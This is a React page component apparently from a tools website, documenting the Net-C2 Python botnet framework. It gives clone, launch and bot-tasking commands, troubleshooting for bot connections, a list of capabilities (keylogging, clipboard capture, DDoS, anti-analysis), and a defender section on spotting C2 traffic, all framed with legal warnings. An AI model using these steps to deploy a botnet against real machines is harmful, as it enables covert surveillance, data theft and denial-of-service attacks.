import { Helmet } from 'react-helmet-async'
import ToolLayout from '../components/ToolLayout'

function Section({ id, icon, title, subtitle, children }) {
  return (
    <section id={id} className="glass p-6 sm:p-7 mb-6 scroll-mt-24">
      <div className="flex items-center gap-3 mb-1">
        <span className="text-xl">{icon}</span>
        <h2 className="text-lg sm:text-xl font-extrabold text-white m-0">{title}</h2>
      </div>
      {subtitle && <p className="text-xs text-slate-400 mt-1 mb-4">{subtitle}</p>}
      {!subtitle && <div className="mb-2" />}
      <div className="space-y-4 text-sm text-slate-300 leading-relaxed">{children}</div>
    </section>
  )
}

function CodeBlock({ title, lines }) {
  return (
    <div className="rounded-xl overflow-hidden border border-white/10" style={{ background: '#0a0f1e' }}>
      <div className="flex items-center gap-2 px-4 py-2 border-b border-white/10" style={{ background: '#111827' }}>
        <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
        <span className="w-2.5 h-2.5 rounded-full bg-green-500/80" />
        {title && <span className="ml-2 text-[11px] font-mono text-slate-400">{title}</span>}
      </div>
      <pre className="p-4 overflow-x-auto text-[13px] leading-relaxed font-mono text-green-300 whitespace-pre-wrap">
{lines}
      </pre>
    </div>
  )
}

function WarningBox({ children }) {
  return (
    <div className="rounded-xl p-4 border border-red-500/30" style={{ background: 'rgba(239,68,68,0.07)' }}>
      <div className="flex items-center gap-2 text-red-300 font-bold text-sm mb-1.5">⚠️ Legal &amp; Ethical Warning</div>
      <div className="text-xs text-red-200/80 leading-relaxed">{children}</div>
    </div>
  )
}

function InfoBox({ title, icon = '💡', children }) {
  return (
    <div className="rounded-xl p-4 border border-cyan-500/25" style={{ background: 'rgba(6,182,212,0.06)' }}>
      <div className="flex items-center gap-2 text-cyan-300 font-bold text-sm mb-1.5">{icon} {title}</div>
      <div className="text-xs text-slate-300 leading-relaxed">{children}</div>
    </div>
  )
}

function FeatureGrid({ items }) {
  return (
    <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
      {items.map(f => (
        <div key={f.t} className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <div className="text-2xl mb-1">{f.i}</div>
          <div className="text-sm font-semibold text-white mb-0.5">{f.t}</div>
          <div className="text-xs text-slate-400">{f.d}</div>
        </div>
      ))}
    </div>
  )
}

function IssueRow({ issue, fix }) {
  return (
    <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
      <div className="flex items-start gap-2">
        <span className="text-red-400 font-bold mt-0.5">✕</span>
        <div className="min-w-0">
          <div className="text-sm font-semibold text-white mb-1">{issue}</div>
          <div className="text-xs text-slate-400 leading-relaxed">
            <span className="text-green-400 font-semibold">Fix: </span>{fix}
          </div>
        </div>
      </div>
    </div>
  )
}

const faq = [
  { q: 'What is Net-C2?', a: 'Net-C2 is an open-source Python botnet command-and-control (C2) framework with an encrypted C2 server, bot client, web dashboard, and tools for DDoS, keylogging, clipboard capture and file transfer.' },
  { q: 'Is Net-C2 legal to use?', a: 'The framework is for educational and research purposes only. Running a botnet against systems you do not own, or using it to attack others, is illegal and prohibited. Study it only on your own lab machines for defense understanding.' },
  { q: 'What do I need to run it?', a: 'Python 3.8+, plus packages like pycryptodome, pynput, requests, flask and dnslib (install via requirements.txt).' },
  { q: 'How do I start the server?', a: 'Clone the repo, pip install -r requirements.txt, then run python3 Server.py. It listens on 0.0.0.0:8080 by default with AES-256 encryption.' },
  { q: 'How do bots connect?', a: 'Run python3 Net.py on a machine, optionally setting C2_HOST and C2_PORT environment variables. The bot connects back to the server and checks in for orders.' },
  { q: 'How do I send commands to a bot?', a: 'From the server console use list to see bots, then cmd &lt;bot_id&gt; &lt;command&gt; to run a command, or broadcast &lt;command&gt; to all bots.' },
  { q: 'Does it have a web dashboard?', a: 'Yes. From the Server console run web start, then open http://localhost:5500 for a Flask-based dashboard with real-time bot status and command sending.' },
  { q: 'Why study a botnet framework?', a: 'Understanding how C2 frameworks, encrypted channels, P2P fallback and DDoS tools work is essential for defenders to detect and stop them. This page is for education and defense only.' },
]

const howItWorks = [
  'Install Net-C2 from the official repository and install its dependencies.',
  'Start the C2 server with python3 Server.py — it listens on an AES-256 encrypted channel.',
  'Run the bot client (python3 Net.py) on a machine; it connects back and checks in.',
  'From the console, list bots and send commands (cmd &lt;bot_id&gt; &lt;command&gt;).',
  'Optionally start the web dashboard (web start) for real-time bot monitoring.',
]

const schema = {
  '@context': 'https://schema.org',
  '@graph': [
    {
      '@type': 'TechArticle',
      headline: 'Net-C2 — Botnet Command & Control Framework (Educational)',
      description: 'How a botnet C2 framework works: Net-C2 server, encrypted bots, web dashboard, commands. For education and defense only.',
      about: 'Net-C2 botnet command and control framework',
      educationalUse: 'Testing, education, and authorized research only',
    },
    {
      '@type': 'FAQPage',
      mainEntity: faq.map(f => ({
        '@type': 'Question',
        name: f.q,
        acceptedAnswer: { '@type': 'Answer', text: f.a },
      })),
    },
  ],
}

export default function hncker_netc2() {
  return (
    <ToolLayout
      title="Net-C2 — Botnet Command & Control (Educational)"
      desc="How a Python botnet C2 framework works — server, encrypted bots, web dashboard. Educational & defense purposes only."
      icon="🧠"
      iconBg="linear-gradient(135deg, rgba(168,85,247,0.18), rgba(0,255,65,0.08))"
      category="security"
      slug="hncker/netc2"
      faq={faq}
      howItWorks={howItWorks}
      schema={schema}
    >
      <Helmet>
        <meta name="robots" content="index, follow" />
        <meta property="og:image" content="https://www.uptools.in/assets/tools/netc2/netc2_scan.png" />
      </Helmet>

      <Section id="video" icon="🎬" title="Video Tutorial" subtitle="Watch the HNCKER walkthrough">
        <div className="max-w-3xl mx-auto">
          <a href="https://www.youtube.com/watch?v=iS_wySR3soo" target="_blank" rel="noopener noreferrer"
            className="block group rounded-xl overflow-hidden border border-white/10 no-underline relative"
            style={{ background: '#000' }}>
            <div className="aspect-video w-full overflow-hidden relative">
              <img
                src="https://i.ytimg.com/vi/iS_wySR3soo/hqdefault.jpg"
                alt="Net-C2 Tutorial - Command and Control Framework Explained"
                loading="lazy"
                className="w-full h-full object-cover transition-transform duration-300 group-hover:scale-[1.03]"
              />
              <div className="absolute inset-0 flex items-center justify-center">
                <div className="w-16 h-16 rounded-full bg-red-600 flex items-center justify-center transition-transform duration-300 group-hover:scale-110">
                  <svg viewBox="0 0 24 24" className="w-8 h-8 ml-1 fill-white"><path d="M8 5v14l11-7z" /></svg>
                </div>
              </div>
            </div>
            <div className="p-4">
              <p className="text-sm font-semibold text-white m-0">Net-C2 Tutorial — Command and Control Framework Explained</p>
              <p className="text-xs text-slate-300 mt-0.5">Watch on YouTube →</p>
            </div>
          </a>
        </div>
      </Section>

      <WarningBox>
        Net-C2 is a botnet command-and-control framework. It is for <b>educational and defense research only</b>.
        Building or running a botnet against systems you do not own — or using it to attack, keylog, or DDoS others —
        is a <b>serious crime</b>. Study it only on your own lab machines to understand and defend against C2
        infrastructure. Malicious use is strictly prohibited.
      </WarningBox>

      <Section id="overview" icon="🧠" title="What is Net-C2?" subtitle="A botnet command & control framework">
        <p>
          <b>Net-C2</b> is an open-source <b>Python botnet framework</b>. It pairs an encrypted <b>C2 server</b> with
          <b> bot clients</b>, a <b>web dashboard</b>, and tools for file transfer, keylogging, clipboard capture and
          DDoS. One server coordinates many connected machines.
        </p>
        <p>
          For defenders, reading how a framework like this works is the best way to learn how to <b>spot and stop</b>
          C2 traffic, encrypted bot channels and P2P fallback. This page is for that purpose — never for attacking.
        </p>
        <FeatureGrid items={[
          { i: '🖥️', t: 'C2 server', d: 'Main control console, listens on an AES-256 channel.' },
          { i: '🤖', t: 'Bot clients', d: 'Machines that connect back and check in for orders.' },
          { i: '🌐', t: 'Web dashboard', d: 'Flask UI with real-time bot status and command sending.' },
          { i: '🔐', t: 'Encrypted comms', d: 'AES-256-CBC and multi-layer encryption.' },
          { i: '🛡️', t: 'Anti-analysis', d: 'Detects analysis tools and has VM detection.' },
          { i: '🔁', t: 'P2P fallback', d: 'Bots fail over to P2P when the server drops.' },
        ]} />
      </Section>

      <Section id="requirements" icon="⚙️" title="System Requirements" subtitle="What you need before running">
        <ul className="list-none p-0 m-0 space-y-2">
          {[
            ['☑️', 'Python 3.8 or newer'],
            ['☑️', 'Required packages: pycryptodome, pynput, requests, flask, dnslib'],
            ['☑️', 'Lab machines you own (never targets you don\'t own)'],
            ['☑️', 'Authorization to run security tooling in your environment'],
          ].map(([c, t]) => (
            <li key={t} className="flex items-start gap-2 text-slate-300">
              <span>{c}</span><span>{t}</span>
            </li>
          ))}
        </ul>
      </Section>

      <Section id="installation" icon="🛠️" title="Installation" subtitle="Clone + install dependencies">
        <CodeBlock title="terminal" lines={`git clone https://github.com/zer0crypt02/Net-C2.git
cd Net-C2
pip install -r requirements.txt`} />
        <InfoBox title="Lab only">
          Install and run this only in an isolated lab you control. Do not run it on or against machines you do not
          own. Never use the keylogger, clipboard capture or DDoS tools against anyone.
        </InfoBox>
      </Section>

      <Section id="usage" icon="🎯" title="Usage Guide" subtitle="Run the framework in order">
        <p className="text-xs text-slate-400">1. Start the C2 server:</p>
        <CodeBlock title="terminal" lines={`python3 Server.py`} />
        <p className="text-xs text-slate-400">2. Start a bot client (on a machine you own):</p>
        <CodeBlock title="terminal" lines={`export C2_HOST=192.168.1.100
export C2_PORT=8080
python3 Net.py`} />
        <p className="text-xs text-slate-400">3. From the server console, list and command bots:</p>
        <CodeBlock title="terminal" lines={`list
cmd Bot-1 whoami
broadcast whoami`} />
        <InfoBox title="Web dashboard">
          From the server console run <span className="font-mono">web start</span>, then open
          <span className="font-mono"> http://localhost:5500</span> for the Flask dashboard with real-time bot status.
        </InfoBox>
      </Section>

      <Section id="screenshots" icon="🖼️" title="Screenshots" subtitle="Net-C2 in action">
        <figure className="rounded-xl overflow-hidden border border-white/10" style={{ background: 'rgba(0,0,0,0.3)' }}>
          <img src="/assets/tools/netc2/netc2_scan.png" alt="Net-C2 server console commanding a bot in the terminal" width="1076" height="1296"
            className="w-full h-auto object-contain" loading="lazy" />
          <figcaption className="px-4 py-2 text-xs text-slate-400">Net-C2 server console listing and commanding a bot</figcaption>
        </figure>
      </Section>

      <Section id="options" icon="🏷️" title="Key Console Commands" subtitle="Understand how C2 control works (defense context)">
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">list</div>
            <div className="text-xs text-slate-400">Show connected bots.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">cmd &lt;bot&gt; &lt;cmd&gt;</div>
            <div className="text-xs text-slate-400">Send a command to one bot.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">sysinfo &lt;bot&gt;</div>
            <div className="text-xs text-slate-400">Pull system info from a bot.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">network_map start &lt;bot&gt;</div>
            <div className="text-xs text-slate-400">Map the local network from a bot.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">tor status</div>
            <div className="text-xs text-slate-400">Check Tor network status for bots.</div>
          </div>
          <div className="rounded-xl p-4 border border-white/8" style={{ background: 'rgba(0,0,0,0.3)' }}>
            <div className="text-sm font-semibold text-green-300 font-mono mb-1">web start</div>
            <div className="text-xs text-slate-400">Launch the Flask web dashboard (port 5500).</div>
          </div>
        </div>
      </Section>

      <Section id="defense" icon="🛡️" title="Why Defenders Study C2" subtitle="Turning this knowledge into protection">
        <p>
          Attackers use C2 frameworks to herd compromised machines. As a defender, understanding the pieces helps you
          detect them:
        </p>
        <ul className="list-none p-0 m-0 space-y-2">
          {[
            ['🔎', 'Encrypted beacons', 'Look for regular encrypted callbacks from endpoints to a central host.'],
            ['🌐', 'Unusual egress', 'Traffic to unknown hosts/ports, Tor, or DNS tunneling is a red flag.'],
            ['🤖', 'P2P chatter', 'Bots talking to many peers instead of one server suggests a mesh.'],
            ['🖥️', 'Suspicious processes', 'Keyloggers, clipboard and screenshot tools running in the background.'],
            ['🧱', 'Isolation', 'Segment your network and restrict egress so a compromise can\'t spread.'],
          ].map(([i, t, d]) => (
            <li key={t} className="flex items-start gap-2 text-slate-300">
              <span>{i}</span>
              <span><b className="text-white">{t}:</b> {d}</span>
            </li>
          ))}
        </ul>
      </Section>

      <Section id="issues" icon="🐞" title="Known Issues & How to Fix Them" subtitle="Real problems people hit, with working fixes">
        <div className="space-y-3">
          <IssueRow
            issue="Bot is not connecting to the server"
            fix="Make sure Server.py is running first, check that the firewall isn't blocking the port, verify C2_HOST and C2_PORT, and confirm bot and server are on the same network."
          />
          <IssueRow
            issue="Module not found after install"
            fix={`Run pip install -r requirements.txt in the repo root. If it persists, use a fresh Python 3.8+ venv and reinstall.`}
          />
          <IssueRow
            issue="Web dashboard not loading"
            fix="Start it with 'web start' from the Server console, open http://your_ip:5500, and confirm Flask and Flask-SocketIO are installed."
          />
          <IssueRow
            issue="Encountered code you shouldn't run on real systems"
            fix="Stick to the lab. Skip the keylogger, clipboard capture and DDoS modules entirely unless you are in an isolated, authorized test environment."
          />
        </div>
      </Section>

      <Section id="resources" icon="🔗" title="Repositories & Resources" subtitle="Official links">
        <div className="space-y-2">
          {[
            ['📦', 'Official repository', 'https://github.com/zer0crypt02/Net-C2'],
            ['🎬', 'HNCKER tutorials', 'https://www.youtube.com/@hncker'],
          ].map(([i, label, href]) => (
            <a key={href} href={href} target="_blank" rel="noopener noreferrer"
              className="flex items-center gap-2 rounded-lg px-3 py-2 border border-white/8 hover:border-brand/40 hover:bg-white/5 transition-all text-slate-300 hover:text-white no-underline">
              <span>{i}</span>
              <span className="text-sm font-medium">{label}</span>
              <span className="ml-auto text-indigo-300 text-xs font-mono break-all">{href}</span>
            </a>
          ))}
        </div>
      </Section>

      <Section id="disclaimer" icon="📜" title="Disclaimer" subtitle="Read before you run anything">
        <p>
          This documentation is provided <b>strictly for educational and authorized research purposes</b>. Net-C2 is a
          botnet command-and-control framework. Building or operating a botnet, or using its keylogging, clipboard,
          file-theft or DDoS capabilities against any system you do not own, is <b>illegal and strictly prohibited</b>.
          Use it only in an isolated lab you control, solely to understand and defend against C2 infrastructure. The
          author and this site are not responsible for any misuse of this information.
        </p>
      </Section>
    </ToolLayout>
  )
}
